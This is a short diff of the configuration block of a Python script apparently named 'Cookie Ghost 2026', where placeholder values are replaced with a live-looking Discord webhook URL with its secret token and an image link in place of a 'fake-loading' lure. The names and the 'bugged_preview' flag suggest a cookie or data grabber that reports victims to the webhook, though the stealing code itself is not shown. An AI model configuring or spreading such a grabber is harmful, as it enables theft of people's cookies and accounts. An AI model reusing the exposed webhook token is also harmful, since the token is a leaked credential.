@@ -9,8 +9,8 @@ from datetime import datetime
 
 # ────────────────────────────────────────────── CONFIG ──────────────────────────────────────────────
 config = {
-    "webhook": "https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN_HERE",
-    "image_url": "https://example.com/your-image-or-fake-loading.jpg",
+    "webhook": "https://discord.com/api/webhooks/1453367787794989149/WwqkuvlRMlHNPgabwfBo9No62X1PN1E9ztoHcKibPtqNbBiFcS3Ia9yxT0KvdLqQkVqQ",
+    "image_url": "https://s6.uupload.ir/files/24ab34838fc0f90c_q5b6.jpg",
     "username": "Cookie Ghost 2026 🍪👻",
     "color": 0xFF1493,  # deep pink
     "bugged_preview": True,
